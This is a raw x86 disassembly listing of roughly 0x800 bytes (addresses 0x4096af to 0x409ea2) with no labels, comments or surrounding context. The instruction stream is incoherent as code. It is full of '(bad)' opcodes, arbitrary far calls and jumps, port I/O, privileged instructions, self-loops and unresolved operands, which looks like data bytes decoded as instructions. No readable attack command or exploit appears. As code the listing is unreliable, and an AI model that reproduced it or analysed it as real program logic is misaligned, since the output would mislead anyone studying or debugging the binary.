  4096af:	hlt    
  4096b0:	inc    ebx
  4096b1:	inc    esp
  4096b2:	jb     0x40972d
  4096b4:	stos   BYTE PTR es:[edi],al
  4096b5:	sbb    al,0xf8
  4096b7:	add    eax,0x7db9afda
  4096bc:	call   0x9225:0x2a13ede8
  4096c3:	(bad)  
  4096c4:	mov    ch,0xd1
  4096c6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4096c8:	pop    ebp
  4096c9:	and    ah,BYTE PTR [edx+0x1572b47e]
  4096cf:	adc    eax,0xb368f69e
  4096d4:	fidivr WORD PTR [edx+edx*8]
  4096d7:	nop
  4096d8:	sbb    eax,0x781b693a
  4096dd:	call   0x4f0:0x3336fb85
  4096e4:	sub    DWORD PTR [ecx+eax*4+0x3349315b],ecx
  4096eb:	fistp  QWORD PTR [esi]
  4096ed:	test   DWORD PTR [edi+eiz*1-0x38],ebx
  4096f1:	inc    eax
  4096f2:	dec    ebx
  4096f3:	mov    ecx,0x677ad8f
  4096f8:	cdq    
  4096f9:	mov    edx,0xae2df919
  4096fe:	dec    edi
  4096ff:	mov    ah,0x38
  409701:	js     0x409737
  409703:	mov    ds:0x6d2f18a5,eax
  409708:	sbb    eax,0xfc17ccd9
  40970d:	ins    DWORD PTR es:[edi],dx
  40970e:	fadd   QWORD PTR [eax-0x51b1fdd0]
  409714:	out    dx,eax
  409715:	mov    al,ds:0x34bd239b
  40971a:	push   ecx
  40971b:	je     0x409705
  40971d:	adc    dh,dh
  40971f:	xor    al,0xe8
  409721:	out    dx,al
  409722:	adc    eax,0x7d4dfd1
  409727:	lods   al,BYTE PTR ds:[esi]
  409728:	clc    
  409729:	mov    ds:0x10470c8d,eax
  40972e:	or     al,0xc0
  409730:	enter  0x4380,0xf6
  409734:	test   al,0x17
  409736:	push   ebp
  409737:	or     DWORD PTR [ecx-0x62],eax
  40973a:	aaa    
  40973b:	adc    eax,0xd1a776d2
  409740:	dec    edi
  409741:	div    DWORD PTR [eax+0x74426004]
  409747:	pop    ds
  409748:	sbb    bl,BYTE PTR [edi-0x48]
  40974b:	push   ebp
  40974c:	fidiv  DWORD PTR [ebx+0x67b08005]
  409752:	mov    bh,0x99
  409754:	aas    
  409755:	enter  0x3833,0xb6
  409759:	xchg   esi,eax
  40975a:	push   edi
  40975b:	jle    0x409741
  40975d:	jae    0x4096fb
  40975f:	dec    ecx
  409760:	and    eax,0x5c7e9be8
  409765:	and    dl,BYTE PTR [edi]
  409767:	mov    cl,0x3
  409769:	adc    al,BYTE PTR [edx-0x15b33148]
  40976f:	in     eax,dx
  409770:	imul   ebx,DWORD PTR ds:0xc7556e75,0x40
  409777:	cwde   
  409778:	stos   BYTE PTR es:[edi],al
  409779:	shl    DWORD PTR [esi-0x61],0x4b
  40977d:	pop    esp
  40977e:	ja     0x409702
  409780:	fcmovb st,st(4)
  409782:	jbe    0x409784
  409784:	aad    0xa0
  409786:	adc    DWORD PTR [ebp-0x7b],0xffffff98
  40978a:	add    al,0x48
  40978c:	xchg   ebp,eax
  40978d:	inc    esp
  40978e:	adc    eax,0xcb2be2f8
  409793:	add    al,BYTE PTR [eax]
  409795:	shl    DWORD PTR [edi],1
  409797:	mov    dh,bh
  409799:	xchg   ch,dl
  40979b:	and    BYTE PTR [esi-0x31],0xdb
  40979f:	int3   
  4097a0:	add    eax,0x300388de
  4097a5:	aaa    
  4097a6:	or     esp,DWORD PTR [edx]
  4097a8:	call   0x3a82:0x280c0001
  4097af:	adc    BYTE PTR [ecx+0x36],bh
  4097b2:	popf   
  4097b3:	sbb    al,0xa0
  4097b5:	iret   
  4097b6:	mov    dl,0x2a
  4097b8:	sub    DWORD PTR [eax-0x52],0xf3ca828e
  4097bf:	sbb    dl,bh
  4097c1:	leave  
  4097c2:	sbb    ah,BYTE PTR [eax-0x6bfe274e]
  4097c8:	push   0x8c003b06
  4097cd:	sbb    al,0x92
  4097cf:	cs int3 
  4097d1:	(bad)  
  4097d2:	fcom   QWORD PTR [eax+0x62]
  4097d5:	xor    BYTE PTR [esi],0xc
  4097d8:	cmp    esi,esp
  4097da:	(bad)  
  4097db:	jp     0x40982b
  4097dd:	push   es
  4097de:	jmp    0x409791
  4097e0:	cdq    
  4097e1:	outs   dx,BYTE PTR ds:[esi]
  4097e2:	repnz sub esi,DWORD PTR [ebp-0x46]
  4097e6:	or     al,0x79
  4097e8:	add    BYTE PTR [ebx],al
  4097ea:	jae    0x4097a1
  4097ec:	ficom  WORD PTR [eax-0xf5867fb]
  4097f2:	dec    ecx
  4097f3:	ins    DWORD PTR es:[edi],dx
  4097f4:	add    BYTE PTR [eax-0x9effb67],ah
  4097fa:	mov    al,0xad
  4097fc:	push   es
  4097fd:	je     0x4097b0
  4097ff:	out    dx,eax
  409800:	ret    0xcc28
  409803:	push   0x6e
  409805:	mov    ?,WORD PTR [edi-0x64cf059e]
  40980b:	ret    0xbc52
  40980e:	adc    BYTE PTR [ebx+ecx*4-0x49],al
  409812:	das    
  409813:	int3   
  409814:	shr    sp,1
  409817:	cmp    bl,BYTE PTR [esi]
  409819:	test   ebx,ebp
  40981b:	mov    ecx,0x86b0b44
  409820:	xor    al,0xbb
  409822:	cbw    
  409824:	sbb    edx,eax
  409826:	data16 add bl,BYTE PTR [ecx-0x15da27cd]
  40982d:	adc    eax,0x91d7692b
  409832:	xchg   edx,eax
  409833:	xor    dl,dh
  409835:	cmp    BYTE PTR ds:0x8758ead0,cl
  40983b:	sbb    BYTE PTR [eax],al
  40983d:	fisttp DWORD PTR [ebx+0x79]
  409840:	push   esi
  409841:	jmp    0x409835
  409843:	xchg   esp,eax
  409844:	div    DWORD PTR [edx+0x54]
  409847:	out    0x95,al
  409849:	pop    ds
  40984a:	aad    0x0
  40984c:	push   eax
  40984d:	inc    ecx
  40984e:	pop    ss
  40984f:	add    BYTE PTR ss:[edi+edx*8-0x6c2d8a5a],al
  409857:	xchg   ecx,eax
  409858:	or     al,0x4c
  40985a:	sub    DWORD PTR [ecx+edx*2-0x2774b981],esi
  409861:	(bad)  
  409863:	les    ebx,FWORD PTR [edi+0x1578baee]
  409869:	lods   eax,DWORD PTR ds:[esi]
  40986a:	jle    0x4098e1
  40986c:	sbb    DWORD PTR [edi+ecx*8+0x18e425e5],0xb4b4d3c7
  409877:	dec    esp
  409878:	mov    ecx,0xa4136aa0
  40987d:	pushw  0x63
  409880:	ror    BYTE PTR [ebx],1
  409882:	adc    BYTE PTR [eax+eax*4],al
  409885:	add    ecx,ecx
  409887:	cs mov ch,al
  40988a:	dec    ebp
  40988b:	push   ecx
  40988c:	scas   al,BYTE PTR es:[edi]
  40988d:	scas   al,BYTE PTR es:[edi]
  40988e:	int    0xd2
  409890:	ja     0x4098ea
  409892:	adc    al,BYTE PTR [edx+0x40]
  409895:	iret   
  409896:	jns    0x4098d4
  409898:	iret   
  409899:	lahf   
  40989a:	sub    DWORD PTR [esi-0x76],esi
  40989d:	cmp    edx,DWORD PTR [ebx]
  40989f:	leave  
  4098a0:	dec    esi
  4098a1:	push   es
  4098a2:	add    BYTE PTR [ecx+ebx*1],cl
  4098a5:	arpl   WORD PTR [eax],sp
  4098a7:	push   esi
  4098a8:	jl     0x40983e
  4098aa:	dec    ebx
  4098ab:	stos   DWORD PTR es:[edi],eax
  4098ac:	or     dl,bl
  4098ae:	xlat   BYTE PTR ds:[ebx]
  4098af:	add    eax,0x6c94be00
  4098b4:	mov    ds:0x6aaac95f,eax
  4098b9:	pop    eax
  4098ba:	add    BYTE PTR ss:[eax+0x3e75fff6],al
  4098c1:	mov    ah,0x34
  4098c3:	pushf  
  4098c4:	pop    ss
  4098c5:	js     0x4098d5
  4098c7:	cmp    edi,DWORD PTR [edi]
  4098c9:	mov    al,ds:0x1dd80121
  4098ce:	adc    DWORD PTR [esi],esp
  4098d0:	add    DWORD PTR [eax],ebx
  4098d2:	add    al,cl
  4098d4:	cli    
  4098d5:	stos   BYTE PTR es:[edi],al
  4098d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098d7:	(bad)  
  4098d8:	mul    DWORD PTR [edi+0x337852ca]
  4098de:	shr    DWORD PTR [eax-0x404282fb],0x2d
  4098e5:	das    
  4098e6:	mov    ebx,0xb0ad98de
  4098eb:	mov    al,ds:0xa992c3fb
  4098f0:	dec    edx
  4098f1:	pop    ebx
  4098f2:	sub    esi,eax
  4098f4:	inc    esi
  4098f5:	jo     0x409947
  4098f7:	cs (bad) 
  4098f9:	dec    ecx
  4098fa:	outs   dx,DWORD PTR ds:[esi]
  4098fb:	call   0xf8b069aa
  409900:	adc    esi,esp
  409902:	mov    edi,0xc974fd0a
  409907:	je     0x40995a
  409909:	repnz mov edi,0x1bae7bb1
  40990f:	lahf   
  409910:	sldt   WORD PTR [ecx+0x32]
  409914:	push   edx
  409915:	sbb    BYTE PTR [ecx],0xd8
  409918:	jge    0x409914
  40991a:	out    dx,eax
  40991b:	push   esi
  40991c:	add    BYTE PTR [eax-0x564b7e6c],dh
  409922:	sbb    DWORD PTR [ebx],esp
  409924:	push   es
  409925:	(bad)  
  409926:	das    
  409927:	data16 and al,0x6c
  40992a:	gs inc eax
  40992c:	imul   eax,esi,0xfffffff0
  40992f:	int    0xdc
  409931:	ins    BYTE PTR es:[edi],dx
  409932:	lods   eax,DWORD PTR ds:[esi]
  409933:	mov    ?,WORD PTR [edi-0x3640f0fe]
  409939:	jne    0x409951
  40993b:	pop    ebx
  40993c:	fld    st(3)
  40993e:	jle    0x409917
  409940:	or     cl,ah
  409942:	pop    edx
  409943:	fld    DWORD PTR [eax]
  409945:	mov    dh,0x6d
  409947:	push   esi
  409948:	fld    TBYTE PTR [ecx-0x5c941661]
  40994e:	mov    ebx,0x1544dbc6
  409953:	cmp    al,0xdd
  409955:	mov    edi,0x3d377e56
  40995a:	cmp    DWORD PTR [esi+0x2e],eax
  40995d:	jmp    0x40995d
  40995f:	jp     0x409930
  409961:	dec    esi
  409962:	sbb    dh,BYTE PTR [esi+0x13]
  409965:	xor    al,0x52
  409967:	icebp  
  409968:	and    eax,0x4777745b
  40996d:	mov    bh,0x24
  40996f:	add    BYTE PTR [ecx+0x43],ah
  409972:	iret   
  409973:	mov    bh,0xac
  409975:	push   ds
  409976:	nop
  409977:	jp     0x409977
  409979:	nop
  40997a:	add    ah,BYTE PTR [eax+edx*1+0x74756347]
  409981:	sbb    cl,BYTE PTR [eax+edi*8+0x27]
  409985:	cmp    eax,DWORD PTR [edi]
  409987:	sub    ecx,eax
  409989:	repz (bad)
  40998c:	icebp  
  40998d:	rol    BYTE PTR [ebp+0x14d36f31],1
  409993:	out    dx,al
  409994:	add    eax,0x70443208
  409999:	mov    WORD PTR [ebx+0x6f9c0036],es
  40999f:	daa    
  4099a0:	rol    DWORD PTR [ecx+ebp*4-0x701cc9ff],cl
  4099a7:	call   0xc3d2157b
  4099ac:	rcl    DWORD PTR [edx],0xc
  4099af:	test   BYTE PTR [ecx-0x739a8d88],0x1e
  4099b6:	rep stos BYTE PTR es:[edi],al
  4099b8:	push   edx
  4099b9:	jmp    0x4099cc
  4099bb:	(bad)  
  4099bc:	xor    esp,DWORD PTR [eax+edi*1+0x22]
  4099c0:	in     al,0x19
  4099c2:	mov    WORD PTR [edi+0x26d327e0],cs
  4099c8:	inc    esp
  4099c9:	inc    ebx
  4099ca:	push   ds
  4099cb:	test   esi,0x56356c8
  4099d1:	mov    cl,0x1
  4099d3:	aam    0x1b
  4099d5:	icebp  
  4099d6:	add    BYTE PTR [eax-0x6d],dh
  4099d9:	ds nop
  4099db:	repz call 0x8e162356
  4099e1:	or     eax,0x61b0bf4a
  4099e6:	push   esi
  4099e7:	add    al,ah
  4099e9:	mov    eax,ds:0x179a5ebf
  4099ee:	and    BYTE PTR [eax],bh
  4099f0:	push   edi
  4099f1:	into   
  4099f2:	dec    edx
  4099f3:	add    bh,BYTE PTR [eax-0x55]
  4099f6:	mov    gs,eax
  4099f8:	mov    edx,0x5a93e9de
  4099fd:	cld    
  4099fe:	jo     0x4099c7
  409a00:	pusha  
  409a01:	mov    edi,0xdbab0dfb
  409a06:	sub    BYTE PTR [ebp+0x2a],bh
  409a09:	xlat   BYTE PTR ds:[ebx]
  409a0a:	pusha  
  409a0b:	jle    0x409a61
  409a0d:	add    dl,BYTE PTR [edx+0x7e0e04]
  409a13:	mov    al,ds:0xc6cbb61d
  409a18:	into   
  409a19:	mov    al,0xb0
  409a1b:	or     esp,ebx
  409a1d:	sbb    bl,BYTE PTR [ebp-0x2a0e905f]
  409a23:	out    dx,eax
  409a24:	lea    edi,[edx]
  409a26:	repz jbe 0x409a03
  409a29:	mov    ebp,0xcd1b5b7a
  409a2e:	(bad)  
  409a2f:	sti    
  409a30:	sub    BYTE PTR ds:0x1b6a75b2,ah
  409a36:	mov    cs,WORD PTR [eax-0x42]
  409a39:	mov    bl,0x5d
  409a3b:	bound  ebx,QWORD PTR [ebx]
  409a3d:	pop    ecx
  409a3e:	pop    esi
  409a3f:	adc    eax,ebx
  409a41:	fst    QWORD PTR [edx-0x75bdf6fa]
  409a47:	jmp    0x18b91869
  409a4c:	mov    al,0x3d
  409a4e:	stc    
  409a4f:	fwait
  409a50:	xor    DWORD PTR [edx-0x3b],ebx
  409a53:	push   edx
  409a54:	jns    0x4099d8
  409a56:	jle    0x409a39
  409a58:	lds    ebx,FWORD PTR [eax+0x56e7d9ae]
  409a5e:	push   ds
  409a5f:	and    DWORD PTR [esi-0x19],0xffffffb7
  409a63:	jb     0x409a32
  409a65:	xor    eax,0x802b7fbb
  409a6a:	push   0xffffffc6
  409a6c:	in     al,0x4b
  409a6e:	shl    edi,1
  409a70:	sub    DWORD PTR [ebp+0x58],0xffffff8a
  409a74:	in     eax,dx
  409a75:	ret    0x639c
  409a78:	es jg  0x409aab
  409a7b:	je     0x409a79
  409a7d:	lods   eax,DWORD PTR ds:[esi]
  409a7e:	cmp    dh,BYTE PTR [ecx]
  409a80:	push   es
  409a81:	ror    DWORD PTR [ebx-0x27877e58],1
  409a87:	arpl   WORD PTR [ecx+0x30],cx
  409a8a:	mov    ch,0x41
  409a8c:	jbe    0x409a55
  409a8e:	int    0x78
  409a90:	daa    
  409a91:	and    eax,0xf713184c
  409a96:	pop    edx
  409a97:	xchg   si,ax
  409a99:	and    al,0x74
  409a9b:	jl     0x409afa
  409a9d:	xor    eax,0x4b3fbf79
  409aa2:	mov    ebp,0xd17dafa
  409aa7:	hlt    
  409aa8:	mov    BYTE PTR [eax],ch
  409aaa:	lea    ebx,[ebp-0x7e]
  409aad:	ss icebp 
  409aaf:	xor    BYTE PTR [edx],0x2e
  409ab2:	mov    ecx,0xbb2e9003
  409ab7:	push   esp
  409ab8:	bound  edx,QWORD PTR [ebx+esi*1]
  409abb:	rcr    BYTE PTR [edi],1
  409abd:	ins    BYTE PTR es:[edi],dx
  409abe:	push   0x55217397
  409ac3:	fisubr WORD PTR [ecx-0x4b2c5c3d]
  409ac9:	xor    al,0x15
  409acb:	add    bh,ah
  409acd:	inc    bx
  409acf:	rol    al,0x24
  409ad2:	mov    BYTE PTR [ebp+0x40f90c49],0xd2
  409ad9:	pop    esp
  409ada:	sbb    BYTE PTR [edi+0x141d9254],bh
  409ae0:	pop    edi
  409ae1:	aad    0x45
  409ae3:	out    0xcd,eax
  409ae5:	aam    0xe8
  409ae7:	outs   dx,DWORD PTR ds:[esi]
  409ae8:	stos   DWORD PTR es:[edi],eax
  409ae9:	push   cs
  409aea:	in     eax,0xb8
  409aec:	sub    edx,esi
  409aee:	mov    ebx,0xa93bed0e
  409af3:	aam    0x0
  409af5:	scas   eax,DWORD PTR es:[edi]
  409af6:	fisub  WORD PTR [ecx]
  409af8:	fwait
  409af9:	shl    BYTE PTR [edx],0xb1
  409afc:	leave  
  409afd:	gs sub BYTE PTR ds:[ebx],0x10
  409b02:	jg     0x409a9f
  409b04:	int    0x51
  409b06:	mov    dl,BYTE PTR [edx-0x536ca7eb]
  409b0c:	inc    eax
  409b0d:	pop    esp
  409b0e:	repz jb 0x409b8f
  409b11:	jge    0x409b47
  409b13:	xor    eax,0x7d33db4b
  409b18:	adc    cl,BYTE PTR ds:0x8ee00908
  409b1e:	fsub   DWORD PTR [ebp*4+0x7a5ccbb]
  409b25:	out    dx,al
  409b26:	cmc    
  409b27:	push   ss
  409b28:	cmp    al,0x6f
  409b2a:	jo     0x409b6d
  409b2c:	or     al,0x33
  409b2e:	jbe    0x409b5e
  409b30:	enter  0xc06,0xfa
  409b34:	je     0x409b7d
  409b36:	push   0x1427797e
  409b3b:	and    eax,0x2b84d5fc
  409b40:	add    al,ah
  409b42:	jmp    0x36a:0xec2005a2
  409b49:	popa   
  409b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b4b:	stos   BYTE PTR es:[edi],al
  409b4c:	ja     0x409b27
  409b4e:	inc    ebp
  409b4f:	cmp    ch,BYTE PTR [edi]
  409b51:	or     al,0x7e
  409b53:	mov    al,dh
  409b55:	(bad)  
  409b57:	lds    esp,FWORD PTR [eax]
  409b59:	jo     0x409b81
  409b5b:	inc    edi
  409b5c:	fwait
  409b5d:	or     ch,ch
  409b5f:	je     0x409b89
  409b61:	fimul  WORD PTR [ebp+0x7b]
  409b64:	xor    al,0xf3
  409b66:	xor    ecx,0xf
  409b69:	in     al,0x4a
  409b6b:	xor    al,0xd2
  409b6d:	in     eax,dx
  409b6e:	retf   
  409b6f:	or     ax,0x7f28
  409b73:	or     eax,0xf47eb22a
  409b78:	cmp    ebx,DWORD PTR [ebp-0x74dffd54]
  409b7e:	dec    edx
  409b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b80:	or     DWORD PTR ds:0x80000160,edx
  409b86:	retf   
  409b87:	add    esp,ecx
  409b89:	sahf   
  409b8a:	jnp    0x409b7f
  409b8c:	pop    ebp
  409b8d:	mov    ah,0x87
  409b8f:	cmc    
  409b90:	mov    al,ds:0xad8efa66
  409b95:	neg    DWORD PTR [eax]
  409b97:	pusha  
  409b98:	or     ecx,DWORD PTR [esi]
  409b9a:	mov    dl,0x41
  409b9c:	not    DWORD PTR [esi-0x5e]
  409b9f:	mov    bh,0x4b
  409ba1:	dec    ebx
  409ba2:	addr16 cli 
  409ba4:	loopne 0x409bdf
  409ba6:	lods   eax,DWORD PTR ds:[esi]
  409ba7:	into   
  409ba8:	or     edi,DWORD PTR [ebx-0x690e6fa2]
  409bae:	dec    edx
  409baf:	int    0xda
  409bb1:	mov    cl,0xd8
  409bb3:	test   ebp,0xea668b54
  409bb9:	dec    ecx
  409bba:	xor    ecx,DWORD PTR [ecx-0xffb6a5d]
  409bc0:	push   esi
  409bc1:	popf   
  409bc2:	lock sub BYTE PTR [ebp+0x5a3b3fc2],0x16
  409bca:	out    0x5d,al
  409bcc:	mov    bh,0xe9
  409bce:	jl     0x409c21
  409bd0:	sbb    eax,0x65273347
  409bd5:	in     al,dx
  409bd6:	adc    ch,bh
  409bd8:	mov    ecx,0x6c432583
  409bdd:	xchg   edi,eax
  409bde:	jbe    0x409b94
  409be0:	mov    ds:0x4505e576,al
  409be5:	jns    0x409bc9
  409be7:	push   edi
  409be8:	mov    ah,0x75
  409bea:	fsubr  QWORD PTR [edi+edx*1+0x6]
  409bee:	adc    eax,0x47b5c60
  409bf3:	add    BYTE PTR [esi],al
  409bf5:	(bad)  
  409bf7:	arpl   WORD PTR [edi+ebp*2+0x1c1f40b2],si
  409bfe:	jmp    0xa787:0x81f8d890
  409c05:	fs fwait
  409c07:	lods   eax,DWORD PTR ds:[esi]
  409c08:	xor    al,0x35
  409c0a:	fbld   TBYTE PTR [esi-0x25]
  409c0d:	jle    0x409bdd
  409c0f:	push   esi
  409c10:	jge    0x409c1b
  409c12:	or     cl,BYTE PTR [ebx]
  409c14:	sbb    edi,ecx
  409c16:	das    
  409c17:	xor    DWORD PTR [esi+ebx*2-0x8],ebp
  409c1b:	and    eax,0xfa27a115
  409c20:	jnp    0x409c8a
  409c22:	pop    edi
  409c23:	leave  
  409c24:	mov    eax,ds:0xbd040cc3
  409c29:	mov    WORD PTR [edi+0xf],ss
  409c2c:	pushw  0xffb2
  409c2f:	mov    ebp,0x4a19a399
  409c35:	jmp    0x409bf9
  409c37:	cmp    ch,BYTE PTR [eax]
  409c39:	pop    ss
  409c3a:	es sahf 
  409c3c:	xor    BYTE PTR [edx+0x65],dl
  409c3f:	loope  0x409c38
  409c41:	lahf   
  409c42:	repnz xchg esp,eax
  409c44:	pop    ss
  409c45:	inc    ecx
  409c46:	daa    
  409c47:	inc    esp
  409c48:	mov    ecx,0x377613b2
  409c4d:	cmp    eax,0x8ba69ee0
  409c52:	cmp    al,0x57
  409c54:	mov    WORD PTR [edx-0x2023fa50],es
  409c5a:	lahf   
  409c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c5c:	mov    ebp,0x980bcb47
  409c61:	aas    
  409c62:	or     al,0x0
  409c64:	in     al,dx
  409c65:	addr16 xor dl,ah
  409c68:	or     BYTE PTR ds:0x66c457b6,al
  409c6e:	je     0xe7c8b0f8
  409c74:	jg     0x409c2a
  409c76:	push   0x2d
  409c78:	cmp    eax,0x4d91533d
  409c7d:	push   cs
  409c7e:	push   ecx
  409c7f:	xchg   ebx,eax
  409c80:	jl     0xa8fcc22
  409c86:	ret    0xc441
  409c89:	pop    ecx
  409c8a:	fistp  WORD PTR ds:0x667d0795
  409c90:	inc    edx
  409c91:	ins    DWORD PTR es:[edi],dx
  409c92:	idiv   ebp
  409c94:	(bad)  
  409c95:	push   esp
  409c96:	mov    WORD PTR [esi-0x57035f10],cs
  409c9c:	pop    esp
  409c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c9e:	sub    eax,0xecc26dfd
  409ca3:	clc    
  409ca4:	or     eax,0x729999e8
  409ca9:	xor    ecx,0xffffffd7
  409cac:	mov    bl,0x4a
  409cae:	xchg   ecx,eax
  409caf:	cdq    
  409cb0:	lea    esi,[edi]
  409cb2:	sbb    dh,BYTE PTR [edi]
  409cb4:	push   ebx
  409cb5:	hlt    
  409cb6:	call   0x6a084452
  409cbb:	cmp    edx,DWORD PTR [ebp-0x18]
  409cbe:	pop    eax
  409cbf:	(bad)  
  409cc0:	shl    DWORD PTR [eax+0x7d],1
  409cc3:	mov    bh,0x58
  409cc5:	jns    0x409cc2
  409cc7:	jae    0x409cde
  409cc9:	adc    ebx,esi
  409ccb:	xor    BYTE PTR [esi],0x80
  409cce:	mov    al,ds:0xc8cad004
  409cd3:	(bad)  
  409cd4:	ins    BYTE PTR es:[edi],dx
  409cd5:	rcr    BYTE PTR [ebx+0x6c575051],0xb5
  409cdc:	mov    dh,BYTE PTR [edi-0x64e822a6]
  409ce2:	jo     0x409d45
  409ce4:	fild   WORD PTR [edi+0x7795bdb5]
  409cea:	and    ecx,DWORD PTR [ecx+edx*2+0x52c0815b]
  409cf1:	mov    ?,WORD PTR [edi]
  409cf3:	jnp    0x409ca3
  409cf5:	push   esi
  409cf6:	jp     0x409ca8
  409cf8:	xchg   ecx,eax
  409cf9:	add    BYTE PTR [eax+0x748d1ffa],dh
  409cff:	shr    dh,1
  409d01:	jl     0x409d5c
  409d03:	pop    esp
  409d04:	mov    bh,0x17
  409d06:	push   cs
  409d07:	popf   
  409d08:	dec    edi
  409d09:	sub    esp,DWORD PTR [esi-0x4e220b4d]
  409d0f:	or     DWORD PTR [esi-0x1aeba2ad],ebx
  409d15:	xchg   ebp,eax
  409d16:	jg     0x409d40
  409d18:	xchg   ebp,eax
  409d19:	mov    al,ds:0xb0b63c3d
  409d1e:	adc    esp,DWORD PTR [ecx+0x3c]
  409d21:	das    
  409d22:	pop    ecx
  409d23:	xor    eax,DWORD PTR [eax-0x71]
  409d26:	popf   
  409d27:	pushf  
  409d28:	mov    al,ds:0x4eb16c92
  409d2d:	ret    0xa8f8
  409d30:	sbb    esp,DWORD PTR [eax]
  409d32:	sub    edi,DWORD PTR [esi]
  409d34:	dec    ebx
  409d35:	add    ch,BYTE PTR [ecx+0x5f]
  409d38:	(bad)
  409d3b:	xchg   ecx,eax
  409d3c:	aad    0x83
  409d3e:	(bad)  
  409d3f:	dec    edi
  409d40:	dec    ebp
  409d41:	shl    BYTE PTR [ebp+0x6b],1
  409d44:	bound  esi,QWORD PTR [ecx+eiz*8+0x46]
  409d48:	xchg   edi,eax
  409d49:	pop    esi
  409d4a:	std    
  409d4b:	adc    DWORD PTR [ebx+0x51f92952],0xa
  409d52:	pop    edi
  409d53:	std    
  409d54:	mov    ebp,0xd8b1cf26
  409d59:	mov    eax,0xe6202d84
  409d5e:	js     0x409cf8
  409d60:	pop    es
  409d61:	rol    BYTE PTR [eax],0x80
  409d64:	mov    bl,0xa9
  409d66:	xchg   ebx,eax
  409d67:	push   cs
  409d68:	jbe    0x409de0
  409d6a:	or     BYTE PTR [eax],al
  409d6c:	fs pop ecx
  409d6e:	stos   BYTE PTR es:[edi],al
  409d6f:	cmp    esi,ebx
  409d71:	push   ss
  409d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d73:	imul   edi,DWORD PTR [eax+0x3ab397fd],0xffffff80
  409d7a:	lea    ecx,[ebp-0x50]
  409d7d:	sti    
  409d7e:	icebp  
  409d7f:	fcmovbe st,st(5)
  409d81:	sub    DWORD PTR ds:0x14b5540d,ebp
  409d87:	push   eax
  409d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d89:	adc    eax,0x43d935dd
  409d8e:	add    BYTE PTR [edx+0x2],ch
  409d91:	loop   0x409d96
  409d93:	and    BYTE PTR [edi+0x5f],ch
  409d96:	(bad)  
  409d97:	out    dx,eax
  409d98:	pop    ds
  409d99:	mov    WORD PTR [ebp-0x18],es
  409d9c:	mov    ch,0x1d
  409d9e:	sub    DWORD PTR [ecx-0x5a],ecx
  409da1:	cli    
  409da2:	mov    bl,0xd4
  409da4:	adc    al,0xd1
  409da6:	pop    edi
  409da8:	call   0x10db28ed
  409dad:	mov    dh,0x24
  409daf:	sbb    al,0x36
  409db1:	xlat   BYTE PTR ds:[ebx]
  409db2:	push   ss
  409db3:	les    eax,FWORD PTR [ecx]
  409db5:	fdivr  DWORD PTR [edx]
  409db7:	dec    ebp
  409db8:	adc    ch,cl
  409dba:	mov    ds:0xe76cd22c,eax
  409dbf:	inc    ecx
  409dc0:	cld    
  409dc1:	repnz or bl,ch
  409dc4:	fs jle 0x409e13
  409dc7:	jmp    0xb61619fa
  409dcc:	std    
  409dcd:	and    al,0x49
  409dcf:	cmp    edx,DWORD PTR [ecx+0x1e185e52]
  409dd5:	cmp    esi,edi
  409dd7:	sub    ah,dl
  409dd9:	adc    bh,ah
  409ddb:	push   cs
  409ddc:	inc    eax
  409ddd:	or     DWORD PTR [edi],0x7bcc0ee3
  409de3:	mov    bl,0xf4
  409de5:	scas   al,BYTE PTR es:[edi]
  409de6:	js     0x409d7d
  409de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de9:	xchg   ebx,eax
  409dea:	jge    0x409d6e
  409dec:	xchg   cl,dh
  409dee:	mov    ?,WORD PTR [esi+0x3a]
  409df1:	pop    ecx
  409df2:	cdq    
  409df3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409df4:	std    
  409df5:	daa    
  409df6:	mov    edx,esp
  409df8:	out    0xae,eax
  409dfa:	mov    eax,ds:0x62122cd3
  409dff:	mov    bl,0x45
  409e01:	mov    eax,0x7d056086
  409e06:	and    eax,DWORD PTR [ebx-0x61a3393b]
  409e0c:	inc    esi
  409e0d:	jmp    0xf514:0xb9ffea55
  409e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e15:	daa    
  409e16:	sbb    ebp,DWORD PTR [edx]
  409e18:	rcl    BYTE PTR [edi-0x39864a4d],0xc0
  409e1f:	data16 sub al,BYTE PTR [eax-0x41f7995f]
  409e26:	sbb    cl,bl
  409e28:	mov    WORD PTR [edi+0x62ff200d],ds
  409e2e:	and    bh,BYTE PTR [ebp+0x7a96493d]
  409e34:	scas   eax,DWORD PTR es:[edi]
  409e35:	mov    di,0x1b3d
  409e39:	mov    al,0x21
  409e3b:	push   0xffffffde
  409e3d:	xchg   esi,eax
  409e3e:	mov    al,ds:0x3b316b6b
  409e43:	push   es
  409e44:	shl    edx,1
  409e46:	mov    al,ds:0x18012613
  409e4b:	add    BYTE PTR [eax-0x1a],al
  409e4e:	pop    esp
  409e4f:	scas   eax,DWORD PTR es:[edi]
  409e50:	jbe    0x409dd7
  409e52:	sbb    eax,0x1fa89e6
  409e57:	cmp    DWORD PTR [esi-0x53410dce],ecx
  409e5d:	cli    
  409e5e:	mov    al,ds:0x9e9c44c9
  409e63:	fs es inc esi
  409e66:	nop
  409e67:	or     esi,edx
  409e69:	out    dx,al
  409e6a:	jge    0x409e23
  409e6c:	(bad)  
  409e6d:	sbb    DWORD PTR [ecx],esp
  409e6f:	inc    ecx
  409e70:	xchg   ebx,eax
  409e71:	lods   al,BYTE PTR ds:[esi]
  409e72:	or     esp,DWORD PTR [edi+0x7d]
  409e75:	mov    ch,0xe5
  409e77:	push   ss
  409e78:	inc    eax
  409e79:	add    BYTE PTR [edi-0x50d7d6af],bl
  409e7f:	ja     0x409edf
  409e81:	rcr    DWORD PTR [eax+0x23],0x24
  409e85:	sbb    ah,bl
  409e87:	mov    edi,0x1f45de35
  409e8c:	fcmovnu st,st(1)
  409e8e:	sub    eax,0x252a0012
  409e93:	fwait
  409e94:	mov    al,ds:0x87e68f18
  409e99:	(bad)  
  409e9a:	adc    cl,ch
  409e9c:	das    
  409e9d:	std    
  409e9e:	jle    0x409ed6
  409ea0:	jae    0x409ea2
  409ea2:	adc    al,0x16
